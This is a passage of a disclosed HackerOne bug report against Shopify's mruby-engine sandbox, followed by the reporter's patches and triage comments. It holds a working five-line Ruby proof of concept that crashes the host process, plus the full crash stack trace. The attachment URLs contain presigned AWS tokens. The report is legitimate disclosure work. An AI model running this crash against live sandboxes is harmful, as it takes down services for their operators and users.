{"id":180977,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA5Nzc=","url":"https://hackerone.com/reports/180977","title":"Exception cause SIGABRT","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-11-08T20:17:22.613Z","submitted_at":"2016-11-08T20:17:22.613Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"isra17","url":"/isra17","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-16T20:05:23.592Z","bug_reporter_agreed_on_going_public_at":"2016-12-16T20:05:23.558Z","team_member_agreed_on_going_public_at":"2016-12-16T19:35:25.653Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Overriding the `to_s` method of an exception and raise it from a sandboxed mruby evaluation result in a `abort()` call from `mruby`. This results with the whole ruby process terminating.\n\nTested on [4cd4dfc855f0cce18b1ee2f318927c13edb20d14](https://github.com/Shopify/mruby-engine/tree/4cd4dfc855f0cce18b1ee2f318927c13edb20d14)\n\n# POC\n\n```\n# poc.rb\nclass A \u003c Exception\n  def to_s\n  end\nend\nraise A.new\n```\n\n`$ bin/sandbox poc.rb`\n\n# Crash Stacktrace:\n```\n Thread 1 (Thread 0x7fe2b0992700 (LWP 26764)):\n #0  0x00007fe2aff8e428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54\n         resultvar = 0\n         pid = 26764\n         selftid = 26764\n #1  0x00007fe2aff9002a in __GI_abort () at abort.c:89\n         save_stage = 2\n         act = {__sigaction_handler = {sa_handler = 0x7fe2aadaf4e0, sa_sigaction = 0x7fe2aadaf4e0}, sa_mask = {__val = {140611505812704, 0, 140611505991664, 0, 140611527335906, 140611505812704, 140611527442253, 0, 0, 140611505812704, 140611505843808, 0, 0, 140611505812704, 140611505888960, 0}}, sa_flags = 0, sa_restorer = 0x7fe2aadb6e60}\n         sigs = {__val = {32, 0 \u003crepeats 15 times\u003e}}\n #2  0x00007fe2ac234bbc in mrb_exc_raise (mrb=mrb@entry=0x7fe2aadaf4e0, exc=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:295\n No locals.\n #3  0x00007fe2ac234f66 in mrb_raisef (mrb=mrb@entry=0x7fe2aadaf4e0, c=0x7fe2aadb6920, fmt=fmt@entry=0x7fe2ac2a3888 \"%S cannot be converted to %S by #%S\") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:371\n         args = \u003cerror reading variable args (Attempt to dereference a generic pointer.)\u003e\n         mesg = \u003coptimized out\u003e\n #4  0x00007fe2ac24c784 in mrb_convert_type (mrb=mrb@entry=0x7fe2aadaf4e0, val=val@entry=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x7fe2ac2a23d9 \"String\", method=method@entry=0x7fe2ac29fdba \"to_s\") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/object.c:340\n         v = \u003coptimized out\u003e\n #5  0x00007fe2ac23a3ae in mrb_str_to_str (mrb=mrb@entry=0x7fe2aadaf4e0, str=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:1016\n         s = \u003coptimized out\u003e\n #6  0x00007fe2ac23d338 in mrb_string_value_cstr (mrb=0x7fe2aadaf4e0, ptr=ptr@entry=0x7ffefeff51e0) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:2222\n         str = \u003coptimized out\u003e\n         ps = \u003coptimized out\u003e\n         len = \u003coptimized out\u003e\n         p = \u003coptimized out\u003e\n #7  0x00007fe2ac21e4ba in me_mruby_engine_get_exception (self=self@entry=0x7fe2aadaf3e0) at ../../../../ext/mruby_engine/mruby_engine.c:106\n         host_backtrace = 22683040\n         backtrace = {value = {p = 0x7fe2aadb7370, {i_flag = 0, i = 70305752922552}, {sym_flag = 112, sym = 32738}, bp = 0x7fe2aadb7370, fp = 0x7fe2aadb7370, vp = 0x7fe2aadb7370}, w = 140611505845104}\n         class_name_obj = {value = {p = 0x7fe2aadb7280, {i_flag = 0, i = 70305752922432}, {sym_flag = 128, sym = 32738}, bp = 0x7fe2aadb7280, fp = 0x7fe2aadb7280, vp = 0x7fe2aadb7280}, w = 140611505844864}\n         class_name = 0x7fe2aadb7280\n         message = {value = {p = 0x7fe2aadb7430, {i_flag = 0, i = 70305752922648}, {sym_flag = 48, sym = 32738}, bp = 0x7fe2aadb7430, fp = 0x7fe2aadb7430, vp = 0x7fe2aadb7430}, w = 140611505845296}\n         err = \u003coptimized out\u003e\n #8  0x00007fe2ac21c04c in me_mruby_engine_eval (self=self@entry=0x7fe2aadaf3e0, proc=\u003coptimized out\u003e, err=err@entry=0x7ffefeff53d0) at ../../../../ext/mruby_engine/eval_monitored.c:227\n         err_no = \u003coptimized out\u003e\n         thread = 140611505809152\n         ru_then = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27092, __ru_maxrss_word = 27092}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4523, __ru_minflt_word = 4523}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 10, __ru_nvcsw_word = 10}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}\n         ru_now = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27160, __ru_maxrss_word = 27160}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4525, __ru_minflt_word = 4525}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 11, __ru_nvcsw_word = 11}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}\n         bypass_ctx = \u003coptimized out\u003e\n         cid = -214394\n         wait_result = \u003coptimized out\u003e\n #9  0x00007fe2ac21cc61 in ext_mruby_engine_eval (rself=22683280, rpath=22683200, rsource=22683080) at ../../../../ext/mruby_engine/ext.c:199\n         err = 8\n         proc = \u003coptimized out\u003e\n #10 0x00007fe2b049a50b in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #11 0x00007fe2b04a84a3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #12 0x00007fe2b04a94d3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #13 0x00007fe2b049e269 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #14 0x00007fe2b04a3142 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #15 0x00007fe2b0389cfd in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #16 0x00007fe2b038b6fd in ruby_exec_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #17 0x00007fe2b038d83e in ruby_run_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #18 0x000000000040087b in ?? ()\n No symbol table info available.\n #19 0x00007fe2aff79830 in __libc_start_main (main=0x400830, argc=3, argv=0x7ffefeff5e38, init=\u003coptimized out\u003e, fini=\u003coptimized out\u003e, rtld_fini=\u003coptimized out\u003e, stack_end=0x7ffefeff5e28) at ../csu/libc-start.c:291\n         result = \u003coptimized out\u003e\n         unwind_buf = {cancel_jmp_buf = {{jmp_buf = {0, -1400422201668288379, 4196480, 140733176569392, 0, 0, 1399860906120036485, 1393279154571296901}, mask_was_saved = 0}}, priv = {pad = {0x0, 0x0, 0x7ffefeff5e58, 0x7fe2b09c7168}, data = {prev = 0x0, cleanup = 0x0, canceltype = -16818600}}}\n         not_first_call = \u003coptimized out\u003e\n #20 0x00000000004008a9 in _start ()\n No symbol table info available.\nTitle: ruby2.3 crashed with SIGABRT in mrb_exc_raise()\n```\n\nCheers!","vulnerability_information_html":"\u003cp\u003eOverriding the \u003ccode\u003eto_s\u003c/code\u003e method of an exception and raise it from a sandboxed mruby evaluation result in a \u003ccode\u003eabort()\u003c/code\u003e call from \u003ccode\u003emruby\u003c/code\u003e. This results with the whole ruby process terminating.\u003c/p\u003e\n\n\u003cp\u003eTested on \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FShopify%2Fmruby-engine%2Ftree%2F4cd4dfc855f0cce18b1ee2f318927c13edb20d14\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e4cd4dfc855f0cce18b1ee2f318927c13edb20d14\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# poc.rb\nclass A \u0026lt; Exception\n  def to_s\n  end\nend\nraise A.new\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003e$ bin/sandbox poc.rb\u003c/code\u003e\u003c/p\u003e\n\n\u003ch1 id=\"crash-stacktrace\"\u003eCrash Stacktrace:\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e Thread 1 (Thread 0x7fe2b0992700 (LWP 26764)):\n #0  0x00007fe2aff8e428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54\n         resultvar = 0\n         pid = 26764\n         selftid = 26764\n #1  0x00007fe2aff9002a in __GI_abort () at abort.c:89\n         save_stage = 2\n         act = {__sigaction_handler = {sa_handler = 0x7fe2aadaf4e0, sa_sigaction = 0x7fe2aadaf4e0}, sa_mask = {__val = {140611505812704, 0, 140611505991664, 0, 140611527335906, 140611505812704, 140611527442253, 0, 0, 140611505812704, 140611505843808, 0, 0, 140611505812704, 140611505888960, 0}}, sa_flags = 0, sa_restorer = 0x7fe2aadb6e60}\n         sigs = {__val = {32, 0 \u0026lt;repeats 15 times\u0026gt;}}\n #2  0x00007fe2ac234bbc in mrb_exc_raise (mrb=mrb@entry=0x7fe2aadaf4e0, exc=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:295\n No locals.\n #3  0x00007fe2ac234f66 in mrb_raisef (mrb=mrb@entry=0x7fe2aadaf4e0, c=0x7fe2aadb6920, fmt=fmt@entry=0x7fe2ac2a3888 \u0026quot;%S cannot be converted to %S by #%S\u0026quot;) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:371\n         args = \u0026lt;error reading variable args (Attempt to dereference a generic pointer.)\u0026gt;\n         mesg = \u0026lt;optimized out\u0026gt;\n #4  0x00007fe2ac24c784 in mrb_convert_type (mrb=mrb@entry=0x7fe2aadaf4e0, val=val@entry=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x7fe2ac2a23d9 \u0026quot;String\u0026quot;, method=method@entry=0x7fe2ac29fdba \u0026quot;to_s\u0026quot;) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/object.c:340\n         v = \u0026lt;optimized out\u0026gt;\n #5  0x00007fe2ac23a3ae in mrb_str_to_str (mrb=mrb@entry=0x7fe2aadaf4e0, str=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:1016\n         s = \u0026lt;optimized out\u0026gt;\n #6  0x00007fe2ac23d338 in mrb_string_value_cstr (mrb=0x7fe2aadaf4e0, ptr=ptr@entry=0x7ffefeff51e0) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:2222\n         str = \u0026lt;optimized out\u0026gt;\n         ps = \u0026lt;optimized out\u0026gt;\n         len = \u0026lt;optimized out\u0026gt;\n         p = \u0026lt;optimized out\u0026gt;\n #7  0x00007fe2ac21e4ba in me_mruby_engine_get_exception (self=self@entry=0x7fe2aadaf3e0) at ../../../../ext/mruby_engine/mruby_engine.c:106\n         host_backtrace = 22683040\n         backtrace = {value = {p = 0x7fe2aadb7370, {i_flag = 0, i = 70305752922552}, {sym_flag = 112, sym = 32738}, bp = 0x7fe2aadb7370, fp = 0x7fe2aadb7370, vp = 0x7fe2aadb7370}, w = 140611505845104}\n         class_name_obj = {value = {p = 0x7fe2aadb7280, {i_flag = 0, i = 70305752922432}, {sym_flag = 128, sym = 32738}, bp = 0x7fe2aadb7280, fp = 0x7fe2aadb7280, vp = 0x7fe2aadb7280}, w = 140611505844864}\n         class_name = 0x7fe2aadb7280\n         message = {value = {p = 0x7fe2aadb7430, {i_flag = 0, i = 70305752922648}, {sym_flag = 48, sym = 32738}, bp = 0x7fe2aadb7430, fp = 0x7fe2aadb7430, vp = 0x7fe2aadb7430}, w = 140611505845296}\n         err = \u0026lt;optimized out\u0026gt;\n #8  0x00007fe2ac21c04c in me_mruby_engine_eval (self=self@entry=0x7fe2aadaf3e0, proc=\u0026lt;optimized out\u0026gt;, err=err@entry=0x7ffefeff53d0) at ../../../../ext/mruby_engine/eval_monitored.c:227\n         err_no = \u0026lt;optimized out\u0026gt;\n         thread = 140611505809152\n         ru_then = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27092, __ru_maxrss_word = 27092}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4523, __ru_minflt_word = 4523}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 10, __ru_nvcsw_word = 10}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}\n         ru_now = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27160, __ru_maxrss_word = 27160}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4525, __ru_minflt_word = 4525}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 11, __ru_nvcsw_word = 11}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}\n         bypass_ctx = \u0026lt;optimized out\u0026gt;\n         cid = -214394\n         wait_result = \u0026lt;optimized out\u0026gt;\n #9  0x00007fe2ac21cc61 in ext_mruby_engine_eval (rself=22683280, rpath=22683200, rsource=22683080) at ../../../../ext/mruby_engine/ext.c:199\n         err = 8\n         proc = \u0026lt;optimized out\u0026gt;\n #10 0x00007fe2b049a50b in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #11 0x00007fe2b04a84a3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #12 0x00007fe2b04a94d3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #13 0x00007fe2b049e269 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #14 0x00007fe2b04a3142 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #15 0x00007fe2b0389cfd in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #16 0x00007fe2b038b6fd in ruby_exec_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #17 0x00007fe2b038d83e in ruby_run_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #18 0x000000000040087b in ?? ()\n No symbol table info available.\n #19 0x00007fe2aff79830 in __libc_start_main (main=0x400830, argc=3, argv=0x7ffefeff5e38, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7ffefeff5e28) at ../csu/libc-start.c:291\n         result = \u0026lt;optimized out\u0026gt;\n         unwind_buf = {cancel_jmp_buf = {{jmp_buf = {0, -1400422201668288379, 4196480, 140733176569392, 0, 0, 1399860906120036485, 1393279154571296901}, mask_was_saved = 0}}, priv = {pad = {0x0, 0x0, 0x7ffefeff5e58, 0x7fe2b09c7168}, data = {prev = 0x0, cleanup = 0x0, canceltype = -16818600}}}\n         not_first_call = \u0026lt;optimized out\u0026gt;\n #20 0x00000000004008a9 in _start ()\n No symbol table info available.\nTitle: ruby2.3 crashed with SIGABRT in mrb_exc_raise()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheers!\u003c/p\u003e\n","bounty_amount":"10000.0","formatted_bounty":"$10,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-15T19:35:25.689Z","allow_singular_disclosure_after":-124708192.34477367,"singular_disclosure_allowed":true,"vote_count":13,"voters":["isra17","michiel","mpz","eveeez","khizer47","ak1t4","japz","spetr0x","scept1c","arice","and 3 more..."],"severity":{"rating":"high","score":7.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1290720,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is investigating.","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue, and our engineering team is investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-08T21:50:17.903Z","updated_at":"2016-11-08T21:50:17.903Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1291037,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I worked on a patch that fixes the issue and add a spec test to reproduce it. Since I'm unfamiliar with mruby API, I'm not 100% sure this is the right way to handle it, but as for this specific case, checking for `message_obj` to be a string should ensure no exception are raised from `mrb_string_value_cstr`.An alternative might be to properly set up proper exception handling with `MRB_TRY`.","markdown_message":"\u003cp\u003eI worked on a patch that fixes the issue and add a spec test to reproduce it. Since I\u0026#39;m unfamiliar with mruby API, I\u0026#39;m not 100% sure this is the right way to handle it, but as for this specific case, checking for \u003ccode\u003emessage_obj\u003c/code\u003e to be a string should ensure no exception are raised from \u003ccode\u003emrb_string_value_cstr\u003c/code\u003e.An alternative might be to properly set up proper exception handling with \u003ccode\u003eMRB_TRY\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-09T03:01:36.344Z","updated_at":"2016-11-09T03:01:36.344Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":133603,"filename":"0001-Fix-abort-crash-on-invalid-exception-string-conversi.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/133/603/5343779b5fecc147fa5a79a2b3aa2f4c1e16f6a5/0001-Fix-abort-crash-on-invalid-exception-string-conversi.patch?response-content-disposition=attachment%3B%20filename%3D%220001-Fix-abort-crash-on-invalid-exception-string-conversi.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Fix-abort-crash-on-invalid-exception-string-conversi.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT27VLVF5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044518Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDyDghanG6vysQhpIAbM6%2FNloTNBCfelRP1BGB1eeXDqQIgbh0u2InfYPRbM%2F0t24amgCOkVvoWkVHPo82TR%2BcSzPAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDG%2B9r1w6aCtbN7N%2FgSqRA8D1stzGXUi9998X9PqljCsxgqGb%2Fp5uwkl6HJ0ecyYUUOvKKK5bmjBmyhHU2siTJ5oMPHjZxACmC8QQR3zoStgvndU2Zk5FbI60XrAqVuUH%2BAK8pT26qvrZcq89M6eB7hRHvO%2BlRluLVtVVrfnC9UY0ATKZRmiYQyw9njaWy8e1cjtpV8uOzRbjAhSciTaQQ4Rof7K88HsyWXiwgfBdP3a0%2F0Eg3oYuiHO02sK0kJaBKVYS07wec5XsHKb5ikjLS61g4AVfdD4E0s3BTqyyWJeUCuyZ2YF95UI2CgkxcN5uOwwloEhHGonUYBlgrAIqXt%2FcecQNzktOM4Kjb30muwbzt0arTqS1XHySraj31WYHm2Cjy8AzyWIgNzu3Fq1xIENb3SovWG27JzCLGUyEU3ScE8nRNwiiydbGzKllImVZY%2BlC%2Bix1yqgNQOGSyxfVhY5J1d45Od%2BL4mUjygcLy%2FfzSKLf2qk3Prr%2BvcoxR9uUbkbtYRAEtizE%2BcIlRuTm3EFnBIvoMHCuplZLf4vZOpMrMLy9qv8FOusBWsgqdyTGkJS5%2BgtM3tHipB468LJZahmRjNSAud9TlniHiRJFpE4feQDaRgu4UD5waPGdkb1Mb3i2BGePA4gRyDu2hwL2UgW1yGpknpSCsy8uyMOhlVuIUyq7t0qBeid6h%2BvKgio2%2B05MKsls9XtVWxBqwW4LqYzc6KBQa0dOAdmkMORLktM2DWUfeoN%2FP12TUiKzRe%2BPGjaA3xBRgCZ2zNYmbNzYsoqOBfPEmbGygz2YZR0LAXBWrVpPc%2FJcYMLT6Jiu%2B2LCo6XyNRnu8YlFqwJ3EhjYkRvFzarUXssQ7cQHuLkop%2BkUTr8Vig%3D%3D\u0026X-Amz-Signature=3dc7e4c950b060c14699f6575823c751e5c3e352531a436642700668953b72f0"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1291524,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Actually, here's a second and better patch that fix the issue. It uses the same function as the `mirb` tool to get an exception message. I've taken a look at other potential function call that might raise an exception outside of an mrb block and it seems like this is the only potential case.","markdown_message":"\u003cp\u003eActually, here\u0026#39;s a second and better patch that fix the issue. It uses the same function as the \u003ccode\u003emirb\u003c/code\u003e tool to get an exception message. I\u0026#39;ve taken a look at other potential function call that might raise an exception outside of an mrb block and it seems like this is the only potential case.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-09T15:29:01.876Z","updated_at":"2016-11-09T15:29:01.876Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":133658,"filename":"0001-Fix-abort-crash-on-invalid-exception-string-conversi.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/133/658/e4fc27977f75c35f20a03ded91af5f716efcbb9c/0001-Fix-abort-crash-on-invalid-exception-string-conversi.patch?response-content-disposition=attachment%3B%20filename%3D%220001-Fix-abort-crash-on-invalid-exception-string-conversi.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Fix-abort-crash-on-invalid-exception-string-conversi.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT27VLVF5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044518Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDyDghanG6vysQhpIAbM6%2FNloTNBCfelRP1BGB1eeXDqQIgbh0u2InfYPRbM%2F0t24amgCOkVvoWkVHPo82TR%2BcSzPAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDG%2B9r1w6aCtbN7N%2FgSqRA8D1stzGXUi9998X9PqljCsxgqGb%2Fp5uwkl6HJ0ecyYUUOvKKK5bmjBmyhHU2siTJ5oMPHjZxACmC8QQR3zoStgvndU2Zk5FbI60XrAqVuUH%2BAK8pT26qvrZcq89M6eB7hRHvO%2BlRluLVtVVrfnC9UY0ATKZRmiYQyw9njaWy8e1cjtpV8uOzRbjAhSciTaQQ4Rof7K88HsyWXiwgfBdP3a0%2F0Eg3oYuiHO02sK0kJaBKVYS07wec5XsHKb5ikjLS61g4AVfdD4E0s3BTqyyWJeUCuyZ2YF95UI2CgkxcN5uOwwloEhHGonUYBlgrAIqXt%2FcecQNzktOM4Kjb30muwbzt0arTqS1XHySraj31WYHm2Cjy8AzyWIgNzu3Fq1xIENb3SovWG27JzCLGUyEU3ScE8nRNwiiydbGzKllImVZY%2BlC%2Bix1yqgNQOGSyxfVhY5J1d45Od%2BL4mUjygcLy%2FfzSKLf2qk3Prr%2BvcoxR9uUbkbtYRAEtizE%2BcIlRuTm3EFnBIvoMHCuplZLf4vZOpMrMLy9qv8FOusBWsgqdyTGkJS5%2BgtM3tHipB468LJZahmRjNSAud9TlniHiRJFpE4feQDaRgu4UD5waPGdkb1Mb3i2BGePA4gRyDu2hwL2UgW1yGpknpSCsy8uyMOhlVuIUyq7t0qBeid6h%2BvKgio2%2B05MKsls9XtVWxBqwW4LqYzc6KBQa0dOAdmkMORLktM2DWUfeoN%2FP12TUiKzRe%2BPGjaA3xBRgCZ2zNYmbNzYsoqOBfPEmbGygz2YZR0LAXBWrVpPc%2FJcYMLT6Jiu%2B2LCo6XyNRnu8YlFqwJ3EhjYkRvFzarUXssQ7cQHuLkop%2BkUTr8Vig%3D%3D\u0026X-Amz-Signature=ea73d1a86efb209b3321ea7ac7a9a279ff0dadda18ce83f63a3f8ece87a6ab85"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1292288,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi again, and thanks for the suggested patches! As a temporary measure we've made the change you suggested in the second patch:\n\nhttps://github.com/Shopify/mruby-engine/pull/17\n\nHowever, things don't quite work correctly if an exception with an overridden `to_s` (that returns a String) is raised. We're looking into whether this could be due to a 